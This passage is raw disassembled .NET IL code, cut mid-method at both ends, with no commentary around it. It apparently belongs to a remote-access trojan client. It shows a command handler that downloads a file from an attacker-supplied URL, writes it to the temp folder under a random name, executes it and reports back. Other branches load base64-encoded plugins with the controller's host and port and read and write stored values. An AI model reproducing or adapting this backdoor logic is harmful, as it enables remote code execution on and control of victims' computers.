      IL_0d10:  call       string [mscorlib]System.String::Concat(string[])
      IL_0d15:  call       bool ClassLibrary1.OK::Send(string)
      IL_0d1a:  pop
      IL_0d1b:  nop
      IL_0d1c:  leave      IL_1bd2

      IL_0d21:  nop
      IL_0d22:  ldloc.s    V_9
      IL_0d24:  ldstr      "prof"
      IL_0d29:  ldc.i4.0
      IL_0d2a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d2f:  ldc.i4.0
      IL_0d30:  ceq
      IL_0d32:  stloc.s    V_110
      IL_0d34:  ldloc.s    V_110
      IL_0d36:  brfalse    IL_0e0c

      IL_0d3b:  nop
      IL_0d3c:  ldloc.0
      IL_0d3d:  ldc.i4.1
      IL_0d3e:  ldelem.ref
      IL_0d3f:  stloc.s    V_95
      IL_0d41:  nop
      IL_0d42:  ldloc.s    V_95
      IL_0d44:  ldstr      "~"
      IL_0d49:  ldc.i4.0
      IL_0d4a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d4f:  ldc.i4.0
      IL_0d50:  ceq
      IL_0d52:  stloc.s    V_109
      IL_0d54:  ldloc.s    V_109
      IL_0d56:  brfalse.s  IL_0d70

      IL_0d58:  nop
      IL_0d59:  ldloc.0
      IL_0d5a:  ldc.i4.2
      IL_0d5b:  ldelem.ref
      IL_0d5c:  ldloc.0
      IL_0d5d:  ldc.i4.3
      IL_0d5e:  ldelem.ref
      IL_0d5f:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_0d64:  pop
      IL_0d65:  nop
      IL_0d66:  br         IL_0e05

      IL_0d6b:  br         IL_0e05

      IL_0d70:  nop
      IL_0d71:  ldloc.s    V_95
      IL_0d73:  ldstr      "!"
      IL_0d78:  ldc.i4.0
      IL_0d79:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d7e:  ldc.i4.0
      IL_0d7f:  ceq
      IL_0d81:  stloc.s    V_110
      IL_0d83:  ldloc.s    V_110
      IL_0d85:  brfalse.s  IL_0de1

      IL_0d87:  nop
      IL_0d88:  ldloc.0
      IL_0d89:  ldc.i4.2
      IL_0d8a:  ldelem.ref
      IL_0d8b:  ldloc.0
      IL_0d8c:  ldc.i4.3
      IL_0d8d:  ldelem.ref
      IL_0d8e:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_0d93:  pop
      IL_0d94:  ldc.i4.5
      IL_0d95:  newarr     [mscorlib]System.String
      IL_0d9a:  stloc.s    V_94
      IL_0d9c:  ldloc.s    V_94
      IL_0d9e:  ldc.i4.0
      IL_0d9f:  ldstr      "getvalue"
      IL_0da4:  stelem.ref
      IL_0da5:  nop
      IL_0da6:  ldloc.s    V_94
      IL_0da8:  ldc.i4.1
      IL_0da9:  ldsfld     string ClassLibrary1.OK::Y
      IL_0dae:  stelem.ref
      IL_0daf:  nop
      IL_0db0:  ldloc.s    V_94
      IL_0db2:  ldc.i4.2
      IL_0db3:  ldloc.0
      IL_0db4:  ldc.i4.1
      IL_0db5:  ldelem.ref
      IL_0db6:  stelem.ref
      IL_0db7:  nop
      IL_0db8:  ldloc.s    V_94
      IL_0dba:  ldc.i4.3
      IL_0dbb:  ldsfld     string ClassLibrary1.OK::Y
      IL_0dc0:  stelem.ref
      IL_0dc1:  nop
      IL_0dc2:  ldloc.s    V_94
      IL_0dc4:  ldc.i4.4
      IL_0dc5:  ldloc.0
      IL_0dc6:  ldc.i4.1
      IL_0dc7:  ldelem.ref
      IL_0dc8:  call       string ClassLibrary1.OK::GTV(string)
      IL_0dcd:  stelem.ref
      IL_0dce:  nop
      IL_0dcf:  ldloc.s    V_94
      IL_0dd1:  call       string [mscorlib]System.String::Concat(string[])
      IL_0dd6:  call       bool ClassLibrary1.OK::Send(string)
      IL_0ddb:  pop
      IL_0ddc:  nop
      IL_0ddd:  br.s       IL_0e05

      IL_0ddf:  br.s       IL_0e05

      IL_0de1:  nop
      IL_0de2:  ldloc.s    V_95
      IL_0de4:  ldstr      "@"
      IL_0de9:  ldc.i4.0
      IL_0dea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0def:  ldc.i4.0
      IL_0df0:  ceq
      IL_0df2:  stloc.s    V_110
      IL_0df4:  ldloc.s    V_110
      IL_0df6:  brfalse.s  IL_0e05

      IL_0df8:  nop
      IL_0df9:  ldloc.0
      IL_0dfa:  ldc.i4.2
      IL_0dfb:  ldelem.ref
      IL_0dfc:  call       void ClassLibrary1.OK::DLV(string)
      IL_0e01:  nop
      IL_0e02:  nop
      IL_0e03:  br.s       IL_0e05

      IL_0e05:  nop
      IL_0e06:  nop
      IL_0e07:  leave      IL_1bd2

      IL_0e0c:  nop
      IL_0e0d:  ldloc.s    V_9
      IL_0e0f:  ldstr      "rn"
      IL_0e14:  ldc.i4.0
      IL_0e15:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e1a:  ldc.i4.0
      IL_0e1b:  ceq
      IL_0e1d:  ldc.i4.0
      IL_0e1e:  ceq
      IL_0e20:  stloc.s    V_110
      IL_0e22:  ldloc.s    V_110
      IL_0e24:  brfalse.s  IL_0e2b

      IL_0e26:  br         IL_0fb2

      IL_0e2b:  nop
      IL_0e2c:  ldnull
      IL_0e2d:  stloc.2
      IL_0e2e:  ldloc.0
      IL_0e2f:  ldc.i4.2
      IL_0e30:  ldelem.ref
      IL_0e31:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0e36:  ldstr      "http"
      IL_0e3b:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_0e40:  ldc.i4.0
      IL_0e41:  ceq
      IL_0e43:  stloc.s    V_110
      IL_0e45:  ldloc.s    V_110
      IL_0e47:  brfalse.s  IL_0eb8

      IL_0e49:  nop
      .try
      {
        IL_0e4a:  ldc.i4.0
        IL_0e4b:  stloc.s    V_5
        IL_0e4d:  ldloc.0
        IL_0e4e:  ldc.i4.2
        IL_0e4f:  ldelem.ref
        IL_0e50:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_0e55:  ldloca.s   V_5
        IL_0e57:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                           bool&)
        IL_0e5c:  stloc.2
        IL_0e5d:  nop
        IL_0e5e:  leave      IL_0f20

        IL_0e63:  leave.s    IL_0eb7

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e65:  dup
        IL_0e66:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e6b:  stloc.s    V_56
        IL_0e6d:  nop
        IL_0e6e:  ldloc.s    V_56
        IL_0e70:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e75:  nop
        IL_0e76:  ldloc.s    V_56
        IL_0e78:  stloc.s    V_55
        IL_0e7a:  ldstr      "MSG"
        IL_0e7f:  ldsfld     string ClassLibrary1.OK::Y
        IL_0e84:  ldstr      "Execute ERROR"
        IL_0e89:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0e8e:  call       bool ClassLibrary1.OK::Send(string)
        IL_0e93:  pop
        IL_0e94:  ldstr      "bla"
        IL_0e99:  call       bool ClassLibrary1.OK::Send(string)
        IL_0e9e:  pop
        IL_0e9f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ea4:  nop
        IL_0ea5:  nop
        IL_0ea6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0eab:  leave      IL_1bd2

        IL_0eb0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0eb5:  leave.s    IL_0eb7

      }  // end handler
      IL_0eb7:  nop
      IL_0eb8:  nop
      IL_0eb9:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0ebe:  stloc.3
      IL_0ebf:  nop
      .try
      {
        IL_0ec0:  ldloc.3
        IL_0ec1:  ldloc.0
        IL_0ec2:  ldc.i4.2
        IL_0ec3:  ldelem.ref
        IL_0ec4:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0ec9:  stloc.2
        IL_0eca:  leave.s    IL_0f1e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ecc:  dup
        IL_0ecd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ed2:  stloc.s    V_58
        IL_0ed4:  nop
        IL_0ed5:  ldloc.s    V_58
        IL_0ed7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0edc:  nop
        IL_0edd:  ldloc.s    V_58
        IL_0edf:  stloc.s    V_57
        IL_0ee1:  ldstr      "MSG"
        IL_0ee6:  ldsfld     string ClassLibrary1.OK::Y
        IL_0eeb:  ldstr      "Download ERROR"
        IL_0ef0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0ef5:  call       bool ClassLibrary1.OK::Send(string)
        IL_0efa:  pop
        IL_0efb:  ldstr      "bla"
        IL_0f00:  call       bool ClassLibrary1.OK::Send(string)
        IL_0f05:  pop
        IL_0f06:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f0b:  nop
        IL_0f0c:  nop
        IL_0f0d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f12:  leave      IL_1bd2

        IL_0f17:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f1c:  leave.s    IL_0f1e

      }  // end handler
      IL_0f1e:  nop
      IL_0f1f:  nop
      IL_0f20:  nop
      IL_0f21:  ldstr      "bla"
      IL_0f26:  call       bool ClassLibrary1.OK::Send(string)
      IL_0f2b:  pop
      IL_0f2c:  ldc.i4.5
      IL_0f2d:  newarr     [mscorlib]System.String
      IL_0f32:  stloc.s    V_94
      IL_0f34:  ldloc.s    V_94
      IL_0f36:  ldc.i4.0
      IL_0f37:  ldstr      "temp"
      IL_0f3c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0f41:  stelem.ref
      IL_0f42:  nop
      IL_0f43:  ldloc.s    V_94
      IL_0f45:  ldc.i4.1
      IL_0f46:  ldstr      "\\"
      IL_0f4b:  stelem.ref
      IL_0f4c:  nop
      IL_0f4d:  ldloc.s    V_94
      IL_0f4f:  ldc.i4.2
      IL_0f50:  ldc.i4.s   10
      IL_0f52:  call       string ClassLibrary1.OK::RN(int32)
      IL_0f57:  stelem.ref
      IL_0f58:  nop
      IL_0f59:  ldloc.s    V_94
      IL_0f5b:  ldc.i4.3
      IL_0f5c:  ldstr      "."
      IL_0f61:  stelem.ref
      IL_0f62:  nop
      IL_0f63:  ldloc.s    V_94
      IL_0f65:  ldc.i4.4
      IL_0f66:  ldloc.0
      IL_0f67:  ldc.i4.1
      IL_0f68:  ldelem.ref
      IL_0f69:  stelem.ref
      IL_0f6a:  nop
      IL_0f6b:  ldloc.s    V_94
      IL_0f6d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0f72:  stloc.s    V_7
      IL_0f74:  ldloc.s    V_7
      IL_0f76:  ldloc.2
      IL_0f77:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_0f7c:  nop
      IL_0f7d:  ldloc.s    V_7
      IL_0f7f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0f84:  pop
      IL_0f85:  ldstr      "MSG"
      IL_0f8a:  ldsfld     string ClassLibrary1.OK::Y
      IL_0f8f:  ldstr      "Executed As "
      IL_0f94:  ldloc.s    V_7
      IL_0f96:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_0f9b:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0fa0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0fa5:  call       bool ClassLibrary1.OK::Send(string)
      IL_0faa:  pop
      IL_0fab:  nop
      IL_0fac:  leave      IL_1bd2

      IL_0fb1:  nop
      IL_0fb2:  nop
      IL_0fb3:  ldloc.s    V_9
      IL_0fb5:  ldstr      "inv"
      IL_0fba:  ldc.i4.0
      IL_0fbb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0fc0:  ldc.i4.0
      IL_0fc1:  ceq
      IL_0fc3:  stloc.s    V_110
      IL_0fc5:  ldloc.s    V_110
      IL_0fc7:  brfalse    IL_1261

      IL_0fcc:  ldstr      "bla"
      IL_0fd1:  call       bool ClassLibrary1.OK::Send(string)
      IL_0fd6:  pop
      IL_0fd7:  ldloc.0
      IL_0fd8:  ldc.i4.1
      IL_0fd9:  ldelem.ref
      IL_0fda:  call       string ClassLibrary1.OK::GTV(string)
      IL_0fdf:  stloc.s    V_61
      IL_0fe1:  ldloc.s    V_61
      IL_0fe3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0fe8:  ldc.i4.0
      IL_0fe9:  cgt
      IL_0feb:  stloc.s    V_110
      IL_0fed:  ldloc.s    V_110
      IL_0fef:  brfalse.s  IL_1045

      IL_0ff1:  ldloc.s    V_61
      IL_0ff3:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0ff8:  stloc.s    V_59
      IL_0ffa:  ldc.i4.5
      IL_0ffb:  newarr     [mscorlib]System.String
      IL_1000:  stloc.s    V_94
      IL_1002:  ldloc.s    V_94
      IL_1004:  ldc.i4.0
      IL_1005:  ldstr      "pl"
      IL_100a:  stelem.ref
      IL_100b:  nop
      IL_100c:  ldloc.s    V_94
      IL_100e:  ldc.i4.1
      IL_100f:  ldsfld     string ClassLibrary1.OK::Y
      IL_1014:  stelem.ref
      IL_1015:  nop
      IL_1016:  ldloc.s    V_94
      IL_1018:  ldc.i4.2
      IL_1019:  ldloc.0
      IL_101a:  ldc.i4.1
      IL_101b:  ldelem.ref
      IL_101c:  stelem.ref
      IL_101d:  nop
      IL_101e:  ldloc.s    V_94
      IL_1020:  ldc.i4.3
      IL_1021:  ldsfld     string ClassLibrary1.OK::Y
      IL_1026:  stelem.ref
      IL_1027:  nop
      IL_1028:  ldloc.s    V_94
      IL_102a:  ldc.i4.4
      IL_102b:  ldc.i4.0
      IL_102c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1031:  stelem.ref
      IL_1032:  nop
      IL_1033:  ldloc.s    V_94
      IL_1035:  call       string [mscorlib]System.String::Concat(string[])
      IL_103a:  call       bool ClassLibrary1.OK::Send(string)
      IL_103f:  pop
      IL_1040:  br         IL_111d

      IL_1045:  nop
      IL_1046:  ldloc.0
      IL_1047:  ldc.i4.3
      IL_1048:  ldelem.ref
      IL_1049:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_104e:  ldc.i4.1
      IL_104f:  ceq
      IL_1051:  stloc.s    V_110
      IL_1053:  ldloc.s    V_110
      IL_1055:  brfalse.s  IL_10a2

      IL_1057:  ldc.i4.5
      IL_1058:  newarr     [mscorlib]System.String
      IL_105d:  stloc.s    V_94
      IL_105f:  ldloc.s    V_94
      IL_1061:  ldc.i4.0
      IL_1062:  ldstr      "pl"
      IL_1067:  stelem.ref
      IL_1068:  nop
      IL_1069:  ldloc.s    V_94
      IL_106b:  ldc.i4.1
      IL_106c:  ldsfld     string ClassLibrary1.OK::Y
      IL_1071:  stelem.ref
      IL_1072:  nop
      IL_1073:  ldloc.s    V_94
      IL_1075:  ldc.i4.2
      IL_1076:  ldloc.0
      IL_1077:  ldc.i4.1
      IL_1078:  ldelem.ref
      IL_1079:  stelem.ref
      IL_107a:  nop
      IL_107b:  ldloc.s    V_94
      IL_107d:  ldc.i4.3
      IL_107e:  ldsfld     string ClassLibrary1.OK::Y
      IL_1083:  stelem.ref
      IL_1084:  nop
      IL_1085:  ldloc.s    V_94
      IL_1087:  ldc.i4.4
      IL_1088:  ldstr      "False"
      IL_108d:  stelem.ref
      IL_108e:  nop
      IL_108f:  ldloc.s    V_94
      IL_1091:  call       string [mscorlib]System.String::Concat(string[])
      IL_1096:  call       bool ClassLibrary1.OK::Send(string)
      IL_109b:  pop
      IL_109c:  nop
      IL_109d:  leave      IL_1bd2

      IL_10a2:  nop
      IL_10a3:  ldc.i4.0
      IL_10a4:  stloc.s    V_5
      IL_10a6:  ldloc.0
      IL_10a7:  ldc.i4.3
      IL_10a8:  ldelem.ref
      IL_10a9:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_10ae:  ldloca.s   V_5
      IL_10b0:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                         bool&)
      IL_10b5:  stloc.s    V_59
      IL_10b7:  ldloc.0
      IL_10b8:  ldc.i4.1
      IL_10b9:  ldelem.ref
      IL_10ba:  ldloc.s    V_59
      IL_10bc:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
      IL_10c1:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_10c6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_10cb:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_10d0:  stloc.s    V_110
      IL_10d2:  ldloc.s    V_110
      IL_10d4:  brfalse.s  IL_111c

      IL_10d6:  ldc.i4.5
      IL_10d7:  newarr     [mscorlib]System.String
      IL_10dc:  stloc.s    V_94
      IL_10de:  ldloc.s    V_94
      IL_10e0:  ldc.i4.0
      IL_10e1:  ldstr      "pl"
      IL_10e6:  stelem.ref
      IL_10e7:  nop
      IL_10e8:  ldloc.s    V_94
      IL_10ea:  ldc.i4.1
      IL_10eb:  ldsfld     string ClassLibrary1.OK::Y
      IL_10f0:  stelem.ref
      IL_10f1:  nop
      IL_10f2:  ldloc.s    V_94
      IL_10f4:  ldc.i4.2
      IL_10f5:  ldloc.0
      IL_10f6:  ldc.i4.1
      IL_10f7:  ldelem.ref
      IL_10f8:  stelem.ref
      IL_10f9:  nop
      IL_10fa:  ldloc.s    V_94
      IL_10fc:  ldc.i4.3
      IL_10fd:  ldsfld     string ClassLibrary1.OK::Y
      IL_1102:  stelem.ref
      IL_1103:  nop
      IL_1104:  ldloc.s    V_94
      IL_1106:  ldc.i4.4
      IL_1107:  ldc.i4.0
      IL_1108:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_110d:  stelem.ref
      IL_110e:  nop
      IL_110f:  ldloc.s    V_94
      IL_1111:  call       string [mscorlib]System.String::Concat(string[])
      IL_1116:  call       bool ClassLibrary1.OK::Send(string)
      IL_111b:  pop
      IL_111c:  nop
      IL_111d:  nop
      IL_111e:  ldloc.s    V_59
      IL_1120:  ldstr      "A"
      IL_1125:  call       object ClassLibrary1.OK::Plugin(uint8[],
                                                           string)
      IL_112a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_112f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1134:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1139:  stloc.s    V_60
      IL_113b:  ldloc.s    V_60
      IL_113d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1142:  ldnull
      IL_1143:  ldstr      "h"
      IL_1148:  ldc.i4.1
      IL_1149:  newarr     [mscorlib]System.Object
      IL_114e:  stloc.s    V_96
      IL_1150:  ldloc.s    V_96
      IL_1152:  ldc.i4.0
      IL_1153:  ldsfld     string ClassLibrary1.OK::H
      IL_1158:  stelem.ref
      IL_1159:  nop
      IL_115a:  ldloc.s    V_96
      IL_115c:  ldnull
      IL_115d:  ldnull
      IL_115e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1163:  nop
      IL_1164:  ldloc.s    V_60
      IL_1166:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_116b:  ldnull
      IL_116c:  ldstr      "p"
      IL_1171:  ldc.i4.1
      IL_1172:  newarr     [mscorlib]System.Object
      IL_1177:  stloc.s    V_96
      IL_1179:  ldloc.s    V_96
      IL_117b:  ldc.i4.0
      IL_117c:  ldsfld     string ClassLibrary1.OK::P
      IL_1181:  stelem.ref
      IL_1182:  nop
      IL_1183:  ldloc.s    V_96
      IL_1185:  ldnull
      IL_1186:  ldnull
      IL_1187:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_118c:  nop
      IL_118d:  ldloc.s    V_60
      IL_118f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1194:  ldnull
      IL_1195:  ldstr      "osk"
      IL_119a:  ldc.i4.1
      IL_119b:  newarr     [mscorlib]System.Object
      IL_11a0:  stloc.s    V_96
      IL_11a2:  ldloc.s    V_96
      IL_11a4:  ldc.i4.0
      IL_11a5:  ldloc.0
      IL_11a6:  ldc.i4.2
      IL_11a7:  ldelem.ref
      IL_11a8:  stelem.ref
      IL_11a9:  nop
      IL_11aa:  ldloc.s    V_96
      IL_11ac:  ldnull
      IL_11ad:  ldnull
      IL_11ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_11b3:  nop
      IL_11b4:  ldloc.s    V_60
      IL_11b6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11bb:  ldnull
      IL_11bc:  ldstr      "start"
      IL_11c1:  ldc.i4.0
      IL_11c2:  newarr     [mscorlib]System.Object
      IL_11c7:  ldnull
      IL_11c8:  ldnull
      IL_11c9:  ldnull
      IL_11ca:  ldc.i4.1
      IL_11cb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_11d0:  pop
      IL_11d1:  br.s       IL_11db

      IL_11d3:  ldc.i4.1
      IL_11d4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_11d9:  nop
      IL_11da:  nop
      IL_11db:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_11e0:  ldc.i4.0
      IL_11e1:  ceq
      IL_11e3:  box        [mscorlib]System.Boolean
      IL_11e8:  ldloc.s    V_60
      IL_11ea:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11ef:  ldnull
      IL_11f0:  ldstr      "Off"
      IL_11f5:  ldc.i4.0
      IL_11f6:  newarr     [mscorlib]System.Object
      IL_11fb:  ldnull
      IL_11fc:  ldnull
      IL_11fd:  ldnull
      IL_11fe:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1203:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1208:  ldc.i4.1
      IL_1209:  box        [mscorlib]System.Boolean
      IL_120e:  ldc.i4.0
      IL_120f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_1214:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1219:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_121e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1223:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1228:  ldc.i4.0
      IL_1229:  ceq
      IL_122b:  stloc.s    V_110
      IL_122d:  ldloc.s    V_110
      IL_122f:  brtrue.s   IL_11d3

      IL_1231:  ldloc.s    V_60
      IL_1233:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1238:  ldnull
      IL_1239:  ldstr      "off"
      IL_123e:  ldc.i4.1
      IL_123f:  newarr     [mscorlib]System.Object
      IL_1244:  stloc.s    V_96
      IL_1246:  ldloc.s    V_96
      IL_1248:  ldc.i4.0
      IL_1249:  ldc.i4.1
      IL_124a:  box        [mscorlib]System.Boolean
      IL_124f:  stelem.ref
      IL_1250:  nop
      IL_1251:  ldloc.s    V_96
      IL_1253:  ldnull
      IL_1254:  ldnull
      IL_1255:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_125a:  nop
      IL_125b:  nop
      IL_125c:  leave      IL_1bd2

      IL_1261:  nop
      IL_1262:  ldloc.s    V_9
      IL_1264:  ldstr      "ret"
      IL_1269:  ldc.i4.0
      IL_126a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_126f:  ldc.i4.0
      IL_1270:  ceq
      IL_1272:  stloc.s    V_110
      IL_1274:  ldloc.s    V_110
      IL_1276:  brfalse    IL_145e

      IL_127b:  ldstr      "bla"
      IL_1280:  call       bool ClassLibrary1.OK::Send(string)
      IL_1285:  pop
      IL_1286:  ldloc.0
      IL_1287:  ldc.i4.1
      IL_1288:  ldelem.ref
      IL_1289:  call       string ClassLibrary1.OK::GTV(string)
      IL_128e:  stloc.s    V_64
      IL_1290:  ldloc.s    V_64
      IL_1292:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1297:  ldc.i4.0
      IL_1298:  cgt
      IL_129a:  stloc.s    V_110
      IL_129c:  ldloc.s    V_110
      IL_129e:  brfalse.s  IL_12f4

      IL_12a0:  ldloc.s    V_64
      IL_12a2:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_12a7:  stloc.s    V_62
      IL_12a9:  ldc.i4.5
      IL_12aa:  newarr     [mscorlib]System.String
      IL_12af:  stloc.s    V_94
      IL_12b1:  ldloc.s    V_94
      IL_12b3:  ldc.i4.0
      IL_12b4:  ldstr      "pl"
      IL_12b9:  stelem.ref
      IL_12ba:  nop
      IL_12bb:  ldloc.s    V_94
      IL_12bd:  ldc.i4.1
      IL_12be:  ldsfld     string ClassLibrary1.OK::Y
      IL_12c3:  stelem.ref
      IL_12c4:  nop
      IL_12c5:  ldloc.s    V_94
      IL_12c7:  ldc.i4.2
      IL_12c8:  ldloc.0
      IL_12c9:  ldc.i4.1
      IL_12ca:  ldelem.ref
      IL_12cb:  stelem.ref
      IL_12cc:  nop
      IL_12cd:  ldloc.s    V_94
      IL_12cf:  ldc.i4.3
      IL_12d0:  ldsfld     string ClassLibrary1.OK::Y
      IL_12d5:  stelem.ref
      IL_12d6:  nop
      IL_12d7:  ldloc.s    V_94
      IL_12d9:  ldc.i4.4
      IL_12da:  ldc.i4.0
      IL_12db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_12e0:  stelem.ref
      IL_12e1:  nop
      IL_12e2:  ldloc.s    V_94
      IL_12e4:  call       string [mscorlib]System.String::Concat(string[])
      IL_12e9:  call       bool ClassLibrary1.OK::Send(string)
      IL_12ee:  pop
      IL_12ef:  br         IL_13cc

      IL_12f4:  nop
      IL_12f5:  ldloc.0
      IL_12f6:  ldc.i4.2
      IL_12f7:  ldelem.ref
      IL_12f8:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_12fd:  ldc.i4.1
      IL_12fe:  ceq
      IL_1300:  stloc.s    V_110
      IL_1302:  ldloc.s    V_110
      IL_1304:  brfalse.s  IL_1351

      IL_1306:  ldc.i4.5
